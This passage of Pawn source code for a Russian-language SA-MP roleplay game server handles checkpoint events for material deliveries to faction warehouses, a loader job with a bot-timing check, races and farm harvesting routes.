	if(CP[playerid] == 500)
	{
		SCM(playerid, COLOR_GREEN, " Вы получили премию, в размере: 600 вирт");
		PlayerInfo[playerid][pCash] += 600;
		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
	}
	else if(MatsArmyCar[playerid] == 20)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] >= 5000 || armmatbi <= 10000)
		{
			format(string, 64, " Склад пуст или грузовик полон!");
			SCM(playerid, COLOR_GREY, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] += 10000;
		format(string, 100, " Материалы успешно загружены! Компоненты материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		armmatbi -= 10000;
		new strings1[50];
		format(strings1,sizeof(strings1), "{33AA33}Склад армии ЛВ: {FFFFFF}%i", armmatbi);
		UpdateDynamic3DTextLabelText(LvaLable, 0xFFFF00FF, strings1);
		DisablePlayerCheckpoint(playerid);
		format(string, 100, " На складе Зоны 51: %i/300000", armmatbi);
		format(string, 100, " Введите: /carm, чтобы начать развозку материалов");
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 35)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || sfpdmats >= 99999)
		{
			format(string, 144, " Склад SFPD заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		sfpdmats += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/100000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад SFPD: %i/100000", sfpdmats);
		SCM(playerid, -1, string);
		return CP[playerid] = 0;
	}
	else if(MatsArmyCar[playerid] == 150)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || lvpdmats >= 99999)
		{
			format(string, 100, " Склад LVPD заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		lvpdmats += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/100000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад LVPD: %i/100000", lvpdmats);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 151)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || lsamatbi >= 99999)
		{
			format(string, 100, " Склад LSA заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		lsamatbi += 10000;
		if(lsamatbi > 99999) lsamatbi = 99999;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад LSA: %i/100000", lsamatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 61)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || hamcmatbi >= 99999)
		{
			format(string, 100, " Склад Hell's Angels MC заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		hamcmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад Hell's Angels MC: %i/100000", hamcmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 63)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || wmcmatbi >= 99999)
		{
			format(string, 100, " Склад Warlocks MC заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		wmcmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад Warlocks MC: %i/50000", wmcmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 66)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || pmcmatbi >= 99999)
		{
			format(string, 100, " Склад Pagans MC заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		pmcmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад Pagans MC: %i/50000", pmcmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 100)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || ballasmatbi >= 99999)
		{
			format(string, 100, " Склад The Ballas заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		ballasmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад The Ballas: %i/100000", ballasmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 101)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || vagosmatbi >= 99999)
		{
			format(string, 100, " Склад The Vagos заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		vagosmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад The Vagos: %i/100000", vagosmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 102)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || groovmatbi >= 99999)
		{
			format(string, 100, "Склад The Grove заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		groovmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад The Grove: %i/100000", groovmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 103)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || aztekmatbi >= 99999)
		{
			format(string, 100, "Склад The Aztec заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		aztekmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад The Aztec: %i/100000", aztekmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 104)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || rifamatbi >= 99999)
		{
			format(string, 100, " Склад The Rifa заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		rifamatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад The Rifa: %i/100000", rifamatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 31)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || lspdmatbi >= 99999)
		{
			format(string, 100, " Склад LSPD заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		lspdmatbi += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid]=0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/100000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад LSPD: %i/100000", lspdmatbi);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 24)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || fbimats >= 99999)
		{
			format(string, 100, "Склад FBI заполнен либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		fbimats += 10000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Материалы успешно доставлены! Материалов: %i/100000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад FBI: %i/100000", fbimats);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 21)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || armmatsf >= 300000)
		{
			format(string, 100, "Cклад Армии SF заполнен, или грузовик пуст!");
			SCM(playerid, COLOR_GRAD1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		armmatsf += 10000;
		if(armmatsf > 300000) armmatsf = 300000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Оружие успешно доставлено! Оружие: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад Армии SF: %i/300000", armmatsf);
		return SCM(playerid, -1, string);
	}
	else if(MatsArmyCar[playerid] == 25)
	{
		if(MatHaul[tmpcar-gunscar[0]][mLoad] == 0 || armmatsf >= 300000)
		{
			format(string, 100, " Склад армии SF заполнен, либо грузовик пуст!");
			SCM(playerid, -1, string);
			DisablePlayerCheckpoint(playerid);
			return true;
		}
		MatHaul[tmpcar-gunscar[0]][mLoad] -= 10000;
		armmatsf += 10000;
		if(armmatsf > 300000) armmatsf = 300000;
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid] = 0;
		format(string, 100, " Оружие успешно доставлено! Оружие: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " Склад Армии SF: %i/300000", armmatsf);
		return SCM(playerid, -1, string);
	}
	if(CP[playerid] == 123)
	{
		DisablePlayerCheckpoint(playerid);
		SCM(playerid, -1, " Введите /sloading для загрузки");
		return CP[playerid] = 0;
	}
	if(GruzCP[playerid] == 1 && PlayerToPoint(2.0,playerid,600.4599,868.0458,-42.9609))
	{
		DisablePlayerCheckpoint(playerid);
		SetPlayerSpecialAction (playerid, SPECIAL_ACTION_CARRY);
		SetPlayerAttachedObject(playerid, 1 , 2358, 1,0.11,0.36,0.0,0.0,90.0);
	}
	if(Works[playerid])
	{
		if(JobCP[playerid] == 1 && IsPlayerInRangeOfPoint(playerid,2.0,2230.3528,-2286.1353,14.3751))
		{
			if(!IsPlayerInAnyVehicle(playerid))
			{
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid,2172.4146,-2255.5405,13.3041,1.5);
				ClearAnimations(playerid);
				ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,1,0,0,1,1,1);
				SetPlayerAttachedObject(playerid, 1 , 2060, 1,0.11,0.36,0.0,0.0,90.0);
				JobCP[playerid] = 2;
				mesh[playerid] = 1;
				usemesh[playerid] = 1;
				SetPVarInt(playerid, "Time_Carry", gettime());
			}
		}
		if(JobCP[playerid] == 2  && IsPlayerInRangeOfPoint(playerid,2.0,2172.4146,-2255.5405,13.3041))
		{
			if(!IsPlayerInAnyVehicle(playerid))
			{
				if(mesh[playerid] < 8) return true;
				JobAmmount[playerid] ++;
				format(string,100, "Мешков перетащено: %i",JobAmmount[playerid]);
				SCM(playerid,COLOR_GREEN,string);
				DisablePlayerCheckpoint(playerid);
				mesh[playerid] = 0;
				usemesh[playerid] = 0;
				if(IsPlayerAttachedObjectSlotUsed(playerid,1)) RemovePlayerAttachedObject(playerid,1);
				SetPlayerCheckpoint(playerid,2230.3528,-2286.1353,14.3751,1.5);
				JobCP[playerid] = 1;
				ClearAnimations(playerid);
				ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,0,0,0,0,1,0);
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 1) PlayerInfo[playerid][pQuestP] ++;
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 1 && PlayerInfo[playerid][pQuestP] == 20)
				{
					PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
					ShowPlayerDialogEx(playerid,11230,DIALOG_STYLE_MSGBOX,"Задание","Это снова Вито,вижу тебе нужны права.\nУ меня есть знакомые в Автошколе,они помогут тебе сдать совершенно бесплатно.\nЧтобы добраться до Автошколы,воспользуйся Автобусом или Такси.\n{DDCD70}Задача: Пройдите автосдачу на права(Не покупкая права у инструктора!)\n{17B757}Награда: Бесплатная сдача на права"
					,"Готово","");
					GameTextForPlayer(playerid, "~g~+1000$", 2000, 1);
					PlayerInfo[playerid][pCash] += 1000;
					PlayerInfo[playerid][pQuest] = 2;
					PlayerInfo[playerid][pQuestP] = 0;
					PlayerInfo[playerid][pQuestPF] = 0;
					SCM(playerid,0x30a0a7aa," Задание выполнено");
					mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pQuest = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
			        PlayerInfo[playerid][pCash], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
				}
				new null = GetPVarInt(playerid, "Time_Carry");
				if((gettime() - null) < 10)
				{
				    format(string, 90, " <Warning> %s[%i]: Возможно Бот-Грузчик", PlayerInfo[playerid][pName], playerid);
					ABroadCast(COLOR_REDD,string,2);
				}
			}
		}
	}
	else if(CP[playerid] == 500)
	{
		PlayerInfo[playerid][pCash] += 600;
		CP[playerid] = 0;
		format(string, 32, "~g~+600");
		GameTextForPlayer(playerid, string, 5000, 1);
		DisablePlayerCheckpoint(playerid);
	}
	else
	{
		switch (gPlayerCheckpointStatus[playerid])
		{
		case 12:
			{
				PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				DisablePlayerCheckpoint(playerid);
				gPlayerCheckpointStatus[playerid] = 0;
				GameTextForPlayer(playerid, "~w~Is in~n~~y~House", 5000, 1);
			}
		}
	}
	return true;
}
public OnPlayerLeaveCheckpoint(playerid) return true;
public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"CHECKPOINT: RACECHECKPOINT - %i",playerid);
	SetPVarInt(playerid,"entercheckpoint", GetTickCount());
	if(CP[playerid] == 776) GameTextForPlayer(playerid, "~r~Point Is Established", 3000, 1),CP[playerid] = 0;
	DisablePlayerRaceCheckpoint(playerid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(GetPVarInt(playerid,"gonka") > 0 && race_info[1] == 3)
		{
			DisablePlayerRaceCheckpoint(playerid);
			SetPVarInt(playerid,"gonkaid",GetPVarInt(playerid,"gonkaid")+1);
			if(GetPVarInt(playerid,"gonkaid") == 32)
			{
				if(RaceList < 2)
				{
					SendMes(playerid,COLOR_BLUE," Поздравляем! Вы заняли %i место!",RaceList+1);
					switch(booston)
					{
					case 0:
						{
							format(string,32,"~g~+$%i",15000-(RaceList*5000));
							GameTextForPlayer(playerid,string, 5000, 1);
							PlayerInfo[playerid][pCash] += 15000-(RaceList*5000);
						}
					case 1:
						{
							format(string,32,"~g~+$%i",45000-(RaceList*15000));
							GameTextForPlayer(playerid,string, 5000, 1);
							PlayerInfo[playerid][pCash] += 45000-(RaceList*15000);
						}
					}
				}
				SetPlayerInterior(playerid,3);
				SetPlayerPos(playerid,831.7769,6.8750,1004.1797);
				SetPlayerFacingAngle(playerid,108.1610);
				strmid(RaceInfo[RaceList][rName],PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 32);
				RaceList++;
				DestroyVehicle(RaceInfo[GetPVarInt(playerid,"gonka")-1][rCar]);
				return DeletePVar(playerid,"gonka");
			}
			if(GetPVarInt(playerid,"gonkaid") != 31) SetPlayerRaceCheckpoint(playerid, 0, RaceGonka[GetPVarInt(playerid,"gonkaid")][0x0],RaceGonka[GetPVarInt(playerid,"gonkaid")][0x1],RaceGonka[GetPVarInt(playerid,"gonkaid")][0x2],RaceGonka[GetPVarInt(playerid,"gonkaid")+1][0x0],RaceGonka[GetPVarInt(playerid,"gonkaid")+1][0x1],RaceGonka[GetPVarInt(playerid,"gonkaid")+1][0x2], 8.0);
			else SetPlayerRaceCheckpoint(playerid, 1, RaceGonka[GetPVarInt(playerid,"gonkaid")][0x0],RaceGonka[GetPVarInt(playerid,"gonkaid")][0x1],RaceGonka[GetPVarInt(playerid,"gonkaid")][0x2],0.0,0.0,0.0,8.0);
			format(string,64,"~g~~w~%i / 32~g~",GetPVarInt(playerid,"gonkaid")); GameTextForPlayer(playerid,string, 5000, 4);
		}
		if(GetPVarInt(playerid,"farm_status") == 5)
		{
			SetPVarInt(playerid,"farm_combine", GetPVarInt(playerid,"farm_combine")+1);
			switch(GetPVarInt(playerid,"farm_id"))
			{
			case 1:
				{
					if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_one))
					{
						if((FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] - 5000) >= 0)
						{
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = 5000;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]-=5000;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}5000. {1E5580}Зерна на складе {FFFFFF}%i / 10000",FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						else
						{
						    new null = FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain];
						    FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = null;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] = 0;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}%i. {1E5580}Зерна на складе {FFFFFF}%i / 10000",null, FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						DeletePVar(playerid,"farm_status");
						DeletePVar(playerid,"farm_combine");
					}
					else if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_one)-1) SetPlayerRaceCheckpoint(playerid,1,Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")][2],0,0,0,5.0);
					else SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")+1][0],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")+1][1],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				}
			case 2:
				{
					if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_two))
					{
						if((FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] - 5000) >= 0)
						{
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = 5000;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]-=5000;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}5000. {1E5580}Зерна на складе {FFFFFF}%i / 10000",FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						else
						{
						    new null = FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain];
						    FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = null;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] = 0;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}%i. {1E5580}Зерна на складе {FFFFFF}%i / 10000",null, FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						DeletePVar(playerid,"farm_status");
						DeletePVar(playerid,"farm_combine");
					}
					else if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_two)-1) SetPlayerRaceCheckpoint(playerid,1,Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")][2],0,0,0,5.0);
					else SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")+1][0],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")+1][1],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				}
			case 3:
				{
					if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_three))
					{
						if((FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] - 5000) >= 0)
						{
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = 5000;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]-=5000;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}5000. {1E5580}Зерна на складе {FFFFFF}%i / 10000",FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						else
						{
						    new null = FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain];
						    FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = null;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] = 0;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}%i. {1E5580}Зерна на складе {FFFFFF}%i / 10000",null, FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						DeletePVar(playerid,"farm_status");
						DeletePVar(playerid,"farm_combine");
					}
					else if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_three)-1) SetPlayerRaceCheckpoint(playerid,1,Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")][2],0,0,0,5.0);
					else SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")+1][0],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")+1][1],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				}
			case 4:
				{
					if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_four))
					{
						if((FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] - 5000) >= 0)
						{
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = 5000;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]-=5000;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}5000. {1E5580}Зерна на складе {FFFFFF}%i / 10000",FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						else
						{
						    new null = FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain];
						    FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = null;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] = 0;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}%i. {1E5580}Зерна на складе {FFFFFF}%i / 10000",null, FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						DeletePVar(playerid,"farm_status");
						DeletePVar(playerid,"farm_combine");
					}
					else if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_four)-1) SetPlayerRaceCheckpoint(playerid,1,Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")][2],0,0,0,5.0);
					else SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")+1][0],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")+1][1],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				}
			case 5:
				{
					if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_five))
					{
						if((FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] - 5000) >= 0)
						{
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = 5000;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]-=5000;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}5000. {1E5580}Зерна на складе {FFFFFF}%i / 10000",FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						else
						{
						    new null = FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain];
						    FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] = null;
							FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain] = 0;
							SendMes(playerid, -1," {1E5580}Поле засеяно на {FFFFFF}%i. {1E5580}Зерна на складе {FFFFFF}%i / 10000",null, FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain]);
						}
						DeletePVar(playerid,"farm_status");
						DeletePVar(playerid,"farm_combine");
					}
					else if(GetPVarInt(playerid,"farm_combine") == sizeof(Farmcombine_coord_five)-1) SetPlayerRaceCheckpoint(playerid,1,Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")][2],0,0,0,5.0);
					else SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")][0],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")][1],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")+1][0],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")+1][1],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				}
			}
		}
		if(GetPVarInt(playerid,"farm_status") == 3)
		{
			new car;
			for(new i = 0; i <= TOTALFARM; i++) if(GetPlayerVehicleID(playerid) >= FarmInfo[i][fSeed_Car][0] && GetPlayerVehicleID(playerid) <= FarmInfo[i][fSeed_Car][1]) car = i;
			if(car == 0) return Kick(playerid);
			/*switch(car)
			{
